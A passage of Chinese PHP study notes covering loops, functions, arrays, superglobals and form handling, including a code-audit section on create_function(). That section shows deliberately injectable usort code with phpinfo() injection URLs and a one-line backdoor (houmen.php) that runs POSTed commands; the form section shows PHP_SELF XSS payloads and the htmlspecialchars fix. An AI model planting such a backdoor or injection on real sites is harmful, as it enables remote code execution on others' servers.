5. 如果没有 case 为真，则使用 default 语句

## PHP while 循环

**PHP while 循环在指定条件为 true 时执行代码块。**

在您编写代码时，经常需要反复运行同一代码块。我们可以使用循环来执行这样的任务，而不是在脚本中添加若干几乎相等的代码行。

在 PHP 中，我们有以下循环语句：

- *while* - 只要指定条件为真，则循环代码块
- *do...while* - 先执行一次代码块，然后只要指定条件为真则重复循环
- *for* - 循环代码块指定次数
- *foreach* - 遍历数组中的每个元素并循环代码块

### while 循环

只要指定的条件为真，while 循环就会执行代码块。

```
while (条件为真) {
  要执行的代码;
}
```

下例首先把变量 $x 设置为 1（$x=1）。然后执行 while 循环，只要 $x 小于或等于 5。循环每运行一次，$x 将递增 1：

```php
<?php 
$x=1; 

while($x<=5) {
  echo "这个数字是：$x <br>";
  $x++;
} 
?>
```

### PHP do...while 循环

do...while 循环首先会执行一次代码块，然后检查条件，如果指定条件为真，则重复循环。

```
do {
  要执行的代码;
} while (条件为真);
```

下面的例子首先把变量 $x 设置为 1（$x=1）。然后，do while 循环输出一段字符串，然后对变量 $x 递增 1。随后对条件进行检查（$x 是否小于或等于 5）。只要 $x 小于或等于 5，循环将会继续运行：

```php
<?php 
$x=1; 

do {
  echo "这个数字是：$x <br>";
  $x++;
} while ($x<=5);
?>
```

请注意，do while 循环只在执行循环内的语句之后才对条件进行测试。这意味着 do while 循环至少会执行一次语句，即使条件测试在第一次就失败了。

下面的例子把 $x 设置为 6，然后运行循环，*随后对条件进行检查*：

```php
<?php 
$x=6;

do {
  echo "这个数字是：$x <br>";
  $x++;
} while ($x<=5);
?>
```

## PHP for循环

**PHP for 循环执行代码块指定的次数。**

如果您已经提前确定脚本运行的次数，可以使用 for 循环。

```php
for (init counter; test counter; increment counter) {
  code to be executed;
}
```

参数：

- init counter：初始化循环计数器的值
- test counter：: 评估每个循环迭代。如果值为 TRUE，继续循环。如果它的值为 FALSE，循环结束。
- increment counter：增加循环计数器的值

下面的例子显示了从 0 到 10 的数字：

```php
<?php 
for ($x=0; $x<=10; $x++) {
  echo "数字是：$x <br>";
} 
?>
```

### PHP foreach 循环

foreach 循环只适用于数组，并用于遍历数组中的每个键/值对。

```php
foreach ($array as $value) {
  code to be executed;
}
```

每进行一次循环迭代，当前数组元素的值就会被赋值给 $value 变量，并且数组指针会逐一地移动，直到到达最后一个数组元素。

下面的例子演示的循环将输出给定数组（$colors）的值：

```php
<?php 
$colors = array("red","green","blue","yellow"); 

foreach ($colors as $value) {
  echo "$value <br>";
}
?>
```

## PHP函数

每句话命令后要;来表示结束  否则无法执行 会报错

**PHP 的真正力量来自它的函数：它拥有超过 1000 个内建的函数。**

### PHP 用户定义函数

除了内建的 PHP 函数，我们可以创建我们自己的函数。

函数是可以在程序中重复使用的语句块。

页面加载时函数不会立即执行。

函数只有在被调用时才会执行。

### 在 PHP 创建用户定义函数

用户定义的函数声明以单词 "function" 开头：

```
function functionName() {
  被执行的代码;
}
```

**注释：**函数名能够以字母或下划线开头（而非数字）。

**注释：**函数名对大小写不敏感。

**提示：**函数名应该能够反映函数所执行的任务。

### PHP 函数参数

可以通过参数向函数传递信息。参数类似变量。

参数被定义在函数名之后，括号内部。您可以添加任意多参数，只要用逗号隔开即可。

下面的例子中的函数有一个参数（$fname）。当调用 familyName() 函数时，我们同时要传递一个名字（例如 Bill），这样会输出不同的名字，但是姓氏相同：

```php+HTML
<?php
function familyName($fname) {
  echo "$fname Zhang.<br>";
}

familyName("Li");
familyName("Hong");
familyName("Tao");
familyName("Xiao Mei");
familyName("Jian");
?>
```

### PHP 默认参数值

下面的例子展示了如何使用默认参数。如果我们调用没有参数的 setHeight() 函数，它的参数会取默认值：

```
<?php
function setHeight($minheight=50) {
  echo "The height is : $minheight <br>";
}

setHeight(350);
setHeight(); // 将使用默认值 50
setHeight(135);
setHeight(80);
?>
```

## PHP 函数 - 返回值

如需使函数返回值，请使用 return 语句：

```php
<?php
function sum($x,$y) {
  $z=$x+$y;
  return $z;
}

echo "5 + 10 = " . sum(5,10) . "<br>"; // .用来连接字符串
echo "7 + 13 = " . sum(7,13) . "<br>";
echo "2 + 4 = " . sum(2,4);
?>
```

## PHP创建匿名函数：creat_function

[create_function任意代码执行 - osword's blog (zhzhdoai.github.io)](https://zhzhdoai.github.io/2019/03/18/create-function任意代码执行/#:~:text=create_function,是PHP中创建匿名函数的函数，其第一个参数是匿名函数的参数列表，第二个参数是匿名函数的内容。)

[PHP代码审计之create_function()函数 - My_Dreams - 博客园 (cnblogs.com)](https://www.cnblogs.com/zzjdbk/p/12980483.html)

适用范围：`PHP 4> = 4.0.1`，`PHP 5`，`PHP 7`

功能：根据传递的参数创建匿名函数，并为其返回唯一名称。

语法：

```
create_function(string $args,string $code)
#string $args 声明的函数变量部分

#string $code 执行的方法代码部分
```

### 函数功能分析

```php
<?php
$newfunc=create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');  #php里变量就存的是函数名，变量名()就是执行变量名的函数，没有会报错
#函数体是
return "ln($a) + ln($b) = " . log($a * $b); #' '单引号里放的函数体  特殊符号不用转义说明return返回的时候回执行
#
echo "New anonymous function: $newfunc\n";
echo $newfunc(2, M_E) . "\n";
?>
```

![image-20220831181952803](http://cdn.ayusummer233.top/img/image-20220831181952803.png)

分析：

`create_function()`会创建一个匿名函数（`lambda`样式）。此处创建了一个叫`lambda_1`的函数，在第一个`echo`中显示出名字，并在第二个`echo`语句中执行了此函数。

create_function()函数会在内部执行 eval()，我们发现是执行了后面的`return`语句，属于`create_function()`中的第二个参数`string $code`位置。

因此，上述匿名函数的创建与执行过程等价于：

```php
<?php
function lambda_1($a,$b){
    return "ln($a) + ln($b) = " . log($a * $b);
}
?>
```

`create_function()`函数在代码审计中，主要用来查找项目中的代码注入和回调后门的情况，熟悉了执行流程，我们可以熟练的实现对代码注入的`payload`构造，从而进行漏洞挖掘和找出存在的缺陷。

### 实现代码注入的案例

#### 案例1：

```php
<?php
error_reporting(0);
$sort_by = $_GET['sort_by'];
$sorter = 'strnatcasecmp';
$databases=array('1234','4321');
$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
usort($databases, create_function('$a, $b', $sort_function));
?>
```

`payload`的构造：

```
http://localhost/test1.php?sort_by=%27%22]);}phpinfo();/*
```

![img](http://cdn.ayusummer233.top/img/1937992-20200528133704647-1679751324.png)

 

 

 

还原实际的组合过程：

```
$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by '"]);}phpinfo();/*
```

匿名函数实际的执行：

```
function niming($a,$b){
return 1 * ' . $sorter . '($a["' . $sort_by '"]);}phpinfo();/*
}
```

回车换行整理一下：

```
function niming($a,$b){
return 1 * ' . $sorter . '($a["' . $sort_by '"]);
}
phpinfo();/*
}
```

#### 案例2：

```
<?php
$c=$_GET['c'];
$lambda=create_function('$a,$b',"return (strlen($a)-strlen($b)+" . "strlen($c));");
$array=array('reall long string here,boy','this','midding lenth','larget');
usort($array,$lambda);
print_r($array);
?>
```

`payload`的构造：

```
http://localhost/test2.php?c=1));}phpinfo();/*
```

![img](http://cdn.ayusummer233.top/img/1937992-20200528135733970-253135182.png)

 

 

 还原实际的组合过程：

```
$lambda=create_function('$a,$b',"return (strlen($a)-strlen($b)+" . "strlen(1));}phpinfo();/*));");
```

匿名函数实际的执行：

```
 function ft($a,$b){
    return (strlen($a)-strlen($b)+" . "strlen(1));}phpinfo();/*));
 }
```

回车换行整理一下：

```
 function ft($a,$b){
    return (strlen($a)-strlen($b)+" . "strlen(1));
    }
    phpinfo();
    /*));
 }
```

### 打造后门

houmen.php

```
<?php $func =create_function('',$_POST['cmd']);$func();?>
```

`create_function()`是可以利用当后门的函数，实际上它是通过执行`eval`实现(此处相当于一句话木马)，访问如下：

![img](http://cdn.ayusummer233.top/img/1937992-20200528140551223-1027125403.png)



### create_function()被高版本 PHP 废弃

从`PHP 7.2.0`开始，`create_function()`被废弃

分类: [PHP代码审计](https://www.cnblogs.com/zzjdbk/category/1774962.html)



## PHP数组

**数组能够在单独的变量名中存储一个或多个值。**

数组在单个变量中存储多个值：

```php
<?php
$cars=array("porsche","BMW","Volvo");
echo "I like " . $cars[0] . ", " . $cars[1] . " and " . $cars[2] . ".";
?>
```

### 什么是数组？

数组是特殊的变量，它可以同时保存一个以上的值。

如果您有一个项目列表（例如汽车品牌列表），在单个变量中存储这些品牌名称是这样的：

```
$cars1="porsche";
$cars2="BMW";
$cars3="Volvo";
```

不过，假如您希望对变量进行遍历并找出特定的那个值？或者如果您需要存储 300 个汽车品牌，而不是 3 个呢？

解决方法是创建数组！

数组能够在单一变量名中存储许多值，并且您能够通过引用索引号来访问某个值。

### 在 PHP 中创建数组

在 PHP 中， array() 函数用于创建数组：

```
array();
```

在 PHP 中，有三种数组类型：

- *索引数组* - 带有数字索引的数组
- *关联数组* - 带有指定键的数组
- *多维数组* - 包含一个或多个数组的数组

### PHP 索引数组

有两种创建索引数组的方法：

索引是自动分配的（索引从 0 开始）：

```
$cars=array("porsche","BMW","Volvo");
```

或者也可以手动分配索引：

```
$cars[0]="porsche";
$cars[1]="BMW";
$cars[2]="Volvo";
```

下面的例子创建名为 $cars 的索引数组，为其分配三个元素，然后输出包含数组值的一段文本：

```php
<?php
$cars=array("porsche","BMW","Volvo");
echo "I like " . $cars[0] . ", " . $cars[1] . " and " . $cars[2] . ".";
?>
```

### 获得数组的长度 - count() 函数

count() 函数用于返回数组的长度（元素数）：

```php
<?php
$cars=array("porsche","BMW","Volvo");
echo count($cars);
?>
```

### 遍历索引数组

如需遍历并输出索引数组的所有值，您可以使用 for 循环，就像这样：

```
<?php
$cars=array("porsche","BMW","Volvo");
$arrlength=count($cars);

for($x=0;$x<$arrlength;$x++) {
  echo $cars[$x];
  echo "<br>";
}
?>
```

### PHP 关联数组

关联数组是使用您分配给数组的指定键的数组。

有两种创建关联数组的方法：

```
$age=array("Bill"=>"35","Steve"=>"37","Elon"=>"43");
```

或者：

```
$age['Bill']="63";
$age['Steve']="56";
$age['Elon']="47";
```

随后可以在脚本中使用指定键：

```php
<?php
$age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47");
echo "Elon is " . $age['Elon'] . " years old.";
?>
```

### 遍历关联数组

如需遍历并输出关联数组的所有值，您可以使用 foreach 循环，就像这样：

```php
<?php
$age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47");

foreach($age as $x=>$x_value) {
  echo "Key=" . $x . ", Value=" . $x_value;
  echo "<br>";
}
?>
```

### 多维数组

[多维数组](https://www.w3school.com.cn/php/php_arrays_multi.asp)

## 数组排序

**数组中的元素能够以字母或数字顺序进行升序或降序排序。**

### PHP - 数组的排序函数

在本节中，我们将学习如下 PHP 数组排序函数：

- sort() - 以升序对数组排序
- rsort() - 以降序对数组排序
- asort() - 根据值，以升序对关联数组进行排序
- ksort() - 根据键，以升序对关联数组进行排序
- arsort() - 根据值，以降序对关联数组进行排序
- krsort() - 根据键，以降序对关联数组进行排序

### 对数组进行升序排序 - sort()

下面的例子按照字母升序对数组 $cars 中的元素进行排序：

```
<?php
$cars=array("porsche","BMW","Volvo");
sort($cars);
?>
```

![image-20220823192743126](http://cdn.ayusummer233.top/img/image-20220823192743126.png)

下面的例子按照数字升序对数组 $numbers 中的元素进行排序：

```php
<?php
$numbers=array(3,5,1,22,11);
sort($numbers);
?>
```

![image-20220823193035931](http://cdn.ayusummer233.top/img/image-20220823193035931.png)

### 对数组进行降序排序 - rsort()

下面的例子按照字母降序对数组 $cars 中的元素进行排序：

```
<?php
$cars=array("porsche","BMW","Volvo");
rsort($cars);
?>
```

![image-20220823193011173](http://cdn.ayusummer233.top/img/image-20220823193011173.png)

下面的例子按照数字降序对数组 $numbers 中的元素进行排序：

```
<?php
$numbers=array(3,5,1,22,11);
rsort($numbers);
?>
```



### 根据值对数组进行升序排序 - asort()

下面的例子根据值对关联数组进行升序排序：

```
<?php
$age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47");
asort($age);
?>
```

![image-20220823193106083](http://cdn.ayusummer233.top/img/image-20220823193106083.png)

### 根据键对数组进行升序排序 - ksort()

下面的例子根据键对关联数组进行升序排序：

```
<?php
$age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47");
ksort($age);
?>
```

![image-20220823193127555](http://cdn.ayusummer233.top/img/image-20220823193127555.png)

### 根据值对数组进行降序排序 - arsort()

下面的例子根据值对关联数组进行降序排序：

```php
<?php
$age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47");
arsort($age);
?>
```



### 根据键对数组进行降序排序 - krsort()

下面的例子根据键对关联数组进行降序排序：

```php
<?php
$age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47");
krsort($age);
?>
```

## PHP全局变量-超全局

**超全局变量在 PHP 4.1.0 中引入，是在全部作用域中始终可用的内置变量。**

### PHP 全局变量 - 超全局变量

PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global $variable; 就可以访问它们。

这些超全局变量是：

- $GLOBALS
- $_SERVER
- $_REQUEST
- $_POST
- $_GET
- $_FILES
- $_ENV
- $_COOKIE
- $_SESSION

本节会介绍一些超全局变量，并会在稍后的章节讲解其他的超全局变量。

### $GLOBALS — 引用全局作用域中可用的全部变量

$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。

PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。

下面的例子展示了如何使用超级全局变量 $GLOBALS：  由于 z 是 $GLOBALS 数组中的变量，因此在函数之外也可以访问它。

```php
<?php 
$x = 75; 
$y = 25;
 
function addition() { 
  $GLOBALS['z'] = $GLOBALS['x'] + $GLOBALS['y']; 
}
 
addition(); 
echo $z; 
?>
```

### PHP $_SERVER

$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息。

下面的例子展示了如何使用 $_SERVER 中的某些元素：

```php
<?php 
echo $_SERVER['PHP_SELF'];
echo "<br>";
echo $_SERVER['SERVER_NAME'];
echo "<br>";
echo $_SERVER['HTTP_HOST'];
echo "<br>";
echo $_SERVER['HTTP_REFERER'];
echo "<br>";
echo $_SERVER['HTTP_USER_AGENT'];
echo "<br>";
echo $_SERVER['SCRIPT_NAME'];
?>
```

![image-20220823193554355](http://cdn.ayusummer233.top/img/image-20220823193554355.png)

下表列出了您能够在 $_SERVER 中访问的最重要的元素：

| 元素/代码                       | 描述                                                         |
| :------------------------------ | :----------------------------------------------------------- |
| $_SERVER['PHP_SELF']            | 返回当前执行脚本的文件名。                                   |
| $_SERVER['GATEWAY_INTERFACE']   | 返回服务器使用的 CGI 规范的版本。                            |
| $_SERVER['SERVER_ADDR']         | 返回当前运行脚本所在的服务器的 IP 地址。                     |
| $_SERVER['SERVER_NAME']         | 返回当前运行脚本所在的服务器的主机名（比如 www.w3school.com.cn）。 |
| $_SERVER['SERVER_SOFTWARE']     | 返回服务器标识字符串（比如 Apache/2.2.24）。                 |
| $_SERVER['SERVER_PROTOCOL']     | 返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。     |
| $_SERVER['REQUEST_METHOD']      | 返回访问页面使用的请求方法（例如 POST）。                    |
| $_SERVER['REQUEST_TIME']        | 返回请求开始时的时间戳（例如 1577687494）。                  |
| $_SERVER['QUERY_STRING']        | 返回查询字符串，如果是通过查询字符串访问此页面。             |
| $_SERVER['HTTP_ACCEPT']         | 返回来自当前请求的请求头。                                   |
| $_SERVER['HTTP_ACCEPT_CHARSET'] | 返回来自当前请求的 Accept_Charset 头（ 例如 utf-8,ISO-8859-1） |
| $_SERVER['HTTP_HOST']           | 返回来自当前请求的 Host 头。                                 |
| $_SERVER['HTTP_REFERER']        | 返回当前页面的完整 URL（不可靠，因为不是所有用户代理都支持）。 |
| $_SERVER['HTTPS']               | 是否通过安全 HTTP 协议查询脚本。                             |
| $_SERVER['REMOTE_ADDR']         | 返回浏览当前页面的用户的 IP 地址。                           |
| $_SERVER['REMOTE_HOST']         | 返回浏览当前页面的用户的主机名。                             |
| $_SERVER['REMOTE_PORT']         | 返回用户机器上连接到 Web 服务器所使用的端口号。              |
| $_SERVER['SCRIPT_FILENAME']     | 返回当前执行脚本的绝对路径。                                 |
| $_SERVER['SERVER_ADMIN']        | 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。     |
| $_SERVER['SERVER_PORT']         | Web 服务器使用的端口。默认值为 “80”。                        |
| $_SERVER['SERVER_SIGNATURE']    | 返回服务器版本和虚拟主机名。                                 |
| $_SERVER['PATH_TRANSLATED']     | 当前脚本所在文件系统（非文档根目录）的基本路径。             |
| $_SERVER['SCRIPT_NAME']         | 返回当前脚本的路径。                                         |
| $_SERVER['SCRIPT_URI']          | 返回当前页面的 URI。                                         |

### PHP $_REQUEST

PHP $_REQUEST 用于收集 HTML 表单提交的数据。

下面的例子展示了一个包含输入字段及提交按钮的表单。当用户通过点击提交按钮来提交表单数据时, 表单数据将发送到 `<form>` 标签的 action 属性中指定的脚本文件。在这个例子中，我们指定文件本身来处理表单数据。如果您需要使用其他的 PHP 文件来处理表单数据，请修改为您选择的文件名即可。然后，我们可以使用超级全局变量 $_REQUEST 来收集 input 字段的值：

```php
<html>

<body>

<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
Name: <input type="text" name="fname">
<input type="submit">
</form>

<?php 
$name = $_REQUEST['fname']; 
echo $name; 
?>

</body>
</html>
```

![image-20220823195307402](http://cdn.ayusummer233.top/img/image-20220823195307402.png)

### PHP $_POST

PHP $_POST 广泛用于收集提交 method="post" 的 HTML 表单后的表单数据。$_POST 也常用于传递变量。

下面的例子展示了一个包含输入字段和提交按钮的表单。当用户点击提交按钮来提交数据后，表单数据会发送到 `<form>` 标签的 action 属性中指定的文件。在本例中，我们指定文件本身来处理表单数据。如果您希望使用另一个 PHP 页面来处理表单数据，请用更改为您选择的文件名。然后，我们可以使用超全局变量 $_POST 来收集输入字段的值：

```php
<html>
<body>

<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
Name: <input type="text" name="fname">
<input type="submit">
</form>

<?php 
$name = $_POST['fname'];
echo $name; 
?>

</body>
</html>
```

实际被解析为html文件传送到前端解析时显示的是：  action是自身文件

![image-20220823200359089](http://cdn.ayusummer233.top/img/image-20220823200359089.png)

如果改为：`<form method="post" action="<?php ?>">`    直接action='''' 也一样，实际被解析为html文件传送到前端解析时显示的是：  action为空，但是仍然是自身文件处理

![image-20220823200607326](http://cdn.ayusummer233.top/img/image-20220823200607326.png)

![image-20220823195604241](http://cdn.ayusummer233.top/img/image-20220823195604241.png)



### PHP $_GET

PHP $_GET 也可用于收集提交 HTML 表单 (method="get") 之后的表单数据。

$_GET 也可以收集 URL 中的发送的数据。

假设我们有一张页面含有带参数的超链接：

```php
<html>
<body>

<a href="test_get.php?subject=PHP&web=W3school.com.cn">测试 $GET</a>

</body>
</html>
```

当用户点击链接 "测试 $GET"，参数 "subject" 和 "web" 被发送到 "test_get.php"，然后您就能够通过 $_GET 在 "test_get.php" 中访问这些值了。

下面的例子是 "test_get.php" 中的代码：

```php
<html>
<body>

<?php 
echo "在 " . $_GET['web'] . " 学习 " . $_GET['subject'];
?>

</body>
</html>
```

**提示：**您将在 [PHP 表单](https://www.w3school.com.cn/php/php_forms.asp) 这一节中学到更多有关 $_POST 和 $_GET 的知识。

## PHP表单

**PHP 超全局变量 $_GET 和 $_POST 用于收集表单数据（form-data）。**

### PHP - 一个简单的 HTML 表单

下面的例子显示了一个简单的 HTML 表单，它包含两个输入字段和一个提交按钮：

```php
<html>
<body>

<form action="welcome.php" method="post">
Name: <input type="text" name="name"><br>
E-mail: <input type="text" name="email"><br>
<input type="submit">
</form>

</body>
</html>
```

当用户填写此表单并点击提交按钮后，表单数据会发送到名为 "welcome.php" 的 PHP 文件供处理。表单数据是通过 HTTP POST 方法发送的。

如需显示出被提交的数据，您可以简单地输出（echo）所有变量。"welcome.php" 文件是这样的：

``` php
<html>
<body>

Welcome <?php echo $_POST["name"]; ?><br>
Your email address is: <?php echo $_POST["email"]; ?>

</body>
</html>
```

输出：

```
Welcome Bill
Your email address is Bill.Gates@example.com
```

使用 HTTP GET 方法也能得到相同的结果：

```php
<html>
<body>

<form action="welcome_get.php" method="get">
Name: <input type="text" name="name"><br>
E-mail: <input type="text" name="email"><br>
<input type="submit">
</form>

</body>
</html>
```

welcome_get.php" 是这样的：

```php
<html>
<body>

Welcome <?php echo $_GET["name"]; ?><br>
Your email address is: <?php echo $_GET["email"]; ?>

</body>
</html>
```

上面的代码很简单。不过，最重要的内容被漏掉了。您需要对表单数据进行验证，以防止脚本出现漏洞。

**注意：**在处理 PHP 表单时请关注安全！

本页未包含任何表单验证程序，它只向我们展示如何发送并接收表单数据。

不过稍后的章节会为您讲解如何提高 PHP 表单的安全性！对表单进行适当的安全验证对于抵御黑客攻击和垃圾邮件非常重要！

### GET vs. POST   必须大写

GET 和 POST 都创建数组（例如，array( key => value, key2 => value2, key3 => value3, ...)）。此数组包含键/值对，其中的键是表单控件的名称，而值是来自用户的输入数据。

GET 和 POST 被视作 $_GET 和 $_POST。它们是超全局变量，这意味着对它们的访问无需考虑作用域 - 无需任何特殊代码，您能够从任何函数、类或文件访问它们。

$_GET[‘需要获取数据的来源--表单控件名称’] 是通过 URL 参数传递到当前脚本的变量数组。

$_POST['需要获取数据的来源--表单控件名称'] 是通过 HTTP POST 传递到当前脚本的变量数组。

$_REQUEST['需要获取数据的来源--表单控件名称']可以兼容URL和HTTP POST，从中获取传递到当前脚本的变量数组

### 何时使用 GET？

通过 GET 方法从表单发送的信息*对任何人都是可见的*（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。限制在大约 2000 个字符。不过，由于变量显示在 URL 中，把页面添加到书签中也更为方便。

GET 可用于发送非敏感的数据。

**注释：**绝不能使用 GET 来发送密码或其他敏感信息！

### 何时使用 POST？

通过 POST 方法从表单发送的信息*对其他人是不可见的*（所有名称/值会被嵌入 HTTP 请求的主体中），并且对所发送信息的数量也*无限制*。

此外 POST 支持高阶功能，比如在向服务器上传文件时进行 multi-part 二进制输入。

不过，由于变量未显示在 URL 中，也就无法将页面添加到书签。

**提示：**开发者偏爱 POST 来发送表单数据。

接下来让我们看看如何安全地处理 PHP 表单！

## PHP表单验证

**使用 PHP 来验证表单数据**

## PHP 表单验证

**提示：**在处理 PHP 表单时请重视安全性！

这些页面将展示如何安全地处理 PHP 表单。对 HTML 表单数据进行适当的验证对于防范黑客和垃圾邮件很重要！

我们稍后使用的 HTML 表单包含多种输入字段：必需和可选的文本字段、单选按钮以及提交按钮：

上面的表单使用如下验证规则：

| 字段    | 验证规则                                          |
| :------ | :------------------------------------------------ |
| Name    | 必需。必须包含字母和空格。                        |
| E-mail  | 必需。必须包含有效的电子邮件地址（包含 @ 和 .）。 |
| Website | 可选。如果选填，则必须包含有效的 URL。            |
| Comment | 可选。多行输入字段（文本框）。                    |
| Gender  | 必需。必须选择一项。                              |

首先我们看一下这个表单的纯 HTML 代码：

<iframe src="https://www.w3school.com.cn/demo/demo_form_validation_complete.php" width="700" height="700" seamless="" fr-async-frames="Autoload" style="margin: 15px 0px 0px; padding: 0px; border: 1px solid rgb(221, 221, 221); font-family: &quot;Microsoft YaHei&quot;, system-ui, -apple-system, BlinkMacSystemFont, sans-serif, iconfont, icomoon, FontAwesome, &quot;Font Awesome 5 Pro&quot;, &quot;Font Awesome 6 Pro&quot;, IcoFont, fontello, themify, &quot;Material Icons&quot;, &quot;Material Icons Extended&quot;, bootstrap-icons, &quot;Segoe Fluent Icons&quot;, Material-Design-Iconic-Font, office365icons, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;, &quot;Noto Color Emoji&quot;, &quot;Android Emoji&quot;, EmojiSymbols, &quot;emojione mozilla&quot;, &quot;twemoji mozilla&quot;; text-shadow: rgba(164, 160, 154, 0.85) 0px 0px 0.23px, rgba(123, 123, 123, 0.8) 0px 0px 0.2px, rgba(48, 47, 45, 0.27) 0px 0px 0.15px; -webkit-text-stroke: 0.045px currentcolor; font-feature-settings: &quot;liga&quot; 0; font-variant: no-common-ligatures proportional-nums; font-optical-sizing: auto; font-kerning: auto; -webkit-font-smoothing: antialiased !important; text-rendering: optimizelegibility !important;"></iframe>

### 文本字段

name、email 和 website 属于文本输入元素，comment 字段是文本框。HTML 代码是这样的：

```
Name: <input type="text" name="name">
E-mail: <input type="text" name="email">
Website: <input type="text" name="website">
Comment: <textarea name="comment" rows="5" cols="40"></textarea>
```

### 单选按钮

gender 字段是单选按钮，HTML 代码是这样的：

```
Gender:
<input type="radio" name="gender" value="female">Female  #radio单选
<input type="radio" name="gender" value="male">Male
```

### 表单元素

表单的 HTML 代码是这样的：

```
<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
```

当提交此表单时，通过 method="post" 发送表单数据。

##  $_SERVER["PHP_SELF"] 变量

$_SERVER["PHP_SELF"] 是一种超全局变量，它返回当前执行脚本的文件名。

因此，$_SERVER["PHP_SELF"] 将表单数据发送到页面本身，而不是跳转到另一张页面。这样，用户就能够在表单页面获得错误提示信息。

### 什么是 htmlspecialchars() 函数？

htmlspecialchars() 函数把特殊字符转换为 HTML 实体。这意味着 < 和 > 之类的 HTML 字符会被替换为 \&lt; 和 \&gt; 。这样可防止攻击者通过在表单中注入 HTML 或 JavaScript 代码（跨站点脚本攻击）对代码进行利用。

### 关于 PHP 表单安全性的重要提示_

\_\_FILE\_\_      两个下划线  表示文件的绝对路径

$_SERVER["PHP_SELF"] 变量表示php文件的相对路径  反斜杠表示相对路径/。。。   能够被黑客利用！

如果您的页面使用了 PHP_SELF，用户能够输入下划线然后执行跨站点脚本（XSS）。

**提示：**跨站点脚本（Cross-site scripting，XSS）是一种计算机安全漏洞类型，常见于 Web 应用程序。XSS 能够使攻击者向其他用户浏览的网页中输入客户端脚本。

假设我们的一张名为 "test_form.php" 的页面中有如下表单：

```
<form method="post" action="<?php echo $_SERVER["PHP_SELF"];?>">
```

现在，如果用户进入的是地址栏中正常的 URL："http://www.example.com/test_form.php"，上面的代码会转换为：

```
<form method="post" action="test_form.php">
```

到目前，一切正常。

不过，如果用户在地址栏中键入了如下 URL：

```
http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E
```

在这种情况下，上面的代码会转换为：

```
<form method="post" action="test_form.php"/><script>alert('hacked')</script>
```

这段代码加入了一段脚本和一个提示命令。并且当此页面加载后，就会执行 JavaScript 代码（用户会看到一个提示框）。这仅仅是一个关于 PHP_SELF 变量如何被利用的简单无害案例。

您应该意识到 *<script> 标签内能够添加任何 JavaScript 代码*！黑客能够把用户重定向到另一台服务器上的某个文件，该文件中的恶意代码能够更改全局变量或将表单提交到其他地址以保存用户数据，等等。

### 如果避免 $_SERVER["PHP_SELF"] 被利用？

通过使用 htmlspecialchars() 函数能够避免 $_SERVER["PHP_SELF"] 被利用。

表单代码是这样的：

```
<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>">
```

htmlspecialchars() 函数把特殊字符转换为 HTML 实体。现在，如果用户试图利用 PHP_SELF 变量，会导致如下输出：

```
<form method="post" action="test_form.php/&quot;&gt;&lt;script&gt;alert('hacked')&lt;/script&gt;">
```

无法利用，没有危害！

### 通过 PHP 验证表单数据

我们要做的第一件事是通过 PHP 的 htmlspecialchars() 函数传递所有变量。

在我们使用 htmlspecialchars() 函数后，如果用户试图在文本字段中提交以下内容：

```
<script>location.href('http://www.hacked.com')</script>
```

\- 代码不会执行，因为会被保存为转义代码，就像这样：

```
&lt;script&gt;location.href('http://www.hacked.com')&lt;/script&gt;
```

现在这条代码显示在页面上或 e-mail 中是安全的。

在用户提交该表单时，我们还要做两件事：

1. （通过 PHP trim() 函数）去除用户输入数据中不必要的字符（多余的空格、制表符、换行）
2. （通过 PHP stripslashes() 函数）删除用户输入数据中的反斜杠（\）反转义字符

接下来我们创建一个检查函数（相比一遍遍地写代码，这样效率更好）。

我们把函数命名为 test_input()。

现在，我们能够通过 test_input() 函数检查每个 $_POST 变量，脚本是这样的：

```php
<?php
// 定义变量并设置为空值
$name = $email = $gender = $comment = $website = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $name = test_input($_POST["name"]);
  $email = test_input($_POST["email"]);
  $website = test_input($_POST["website"]);
  $comment = test_input($_POST["comment"]);
  $gender = test_input($_POST["gender"]);
}

function test_input($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data);
  return $data;
}
?>
```

![image-20220824095525668](http://cdn.ayusummer233.top/img/image-20220824095525668.png)

请注意在脚本开头，我们检查了表单是否使用 $_SERVER["REQUEST_METHOD"] 进行提交。如果 REQUEST_METHOD 是 POST，那么表单已被提交 - 并且应该对其进行验证。如果未提交，则跳过验证并显示一个空白表单。

不过，在上面的例子中，所有输入字段都是可选的。即使用户未输入任何数据，脚本也能正常工作。

下一步是制作必填输入字段，并创建需要时使用的错误消息。

## PHP $ _FILES

在PHP中上传一个文件建一个表单要比ASP中灵活得多。如果为单个文件上传，那么 $_FILES 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。

如： 

代码如下:


<form enctype="multipart/form-data" action="upload.php" method="post"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000"> 
<input name="myFile" type="file"> 
<input type="submit" value="上传文件"> 
</form> 

然后upload.php中可以直接用 
$_FILES 
$_POST 
$_GET 
等函数获取表单内容。 
经由 HTTP POST 文件上传而提交至脚本的变量。类似于旧数组 $HTTP_POST_FILES 数组（依然有效，但反对使用）。详细信息请参阅 POST 方法上传。

print_r($_FILES)

```
Array
(
